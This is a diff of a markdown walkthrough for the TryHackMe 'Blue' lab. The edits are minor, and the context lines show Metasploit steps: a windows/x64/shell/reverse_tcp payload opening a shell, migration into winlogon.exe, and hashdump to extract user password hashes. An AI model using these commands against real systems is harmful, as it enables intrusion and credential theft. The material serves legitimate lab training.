@@ -1,6 +1,8 @@
 # Scan example
+This is based on the Blue room on TryHackMe (https://tryhackme.com/room/blue). 
 
-Local IP: `10.18.72.167`
+
+Local IP: `10.18.72.167`   
 Remote IP:`10.10.125.60`
 
 ## Initial scan
@@ -109,7 +111,7 @@ I need to set `RHOSTS` to be the IP address of the host I am attacking (10.18.72
 
 `set RHOSTS 10.10.125.60`
 
-**Running the exploit**
+**Running the exploit**   
 My end-goal is to get a reverse shell on the server, so before I run the exploit I need to tell metasploit to inject a reverse shell payload:
 
 `set payload windows/x64/shell/reverse_tcp`
@@ -129,7 +131,7 @@ Microsoft Windows [Version 6.1.7601]
 C:\Windows\system32>
 ```
 
-**Extending the exploit**
+**Extending the exploit**   
 In the Windows shell that you have created, send it to the background by typing:
 
 `background`
@@ -213,7 +215,7 @@ PID   PPID  Name                  Arch  Session  User                          P
 
 `migrate -N winlogon.exe`
 
-**Dumping hashes**
+**Dumping hashes**   
 Finally, we can dump out the hashes for the users:
 
 `hashdump`
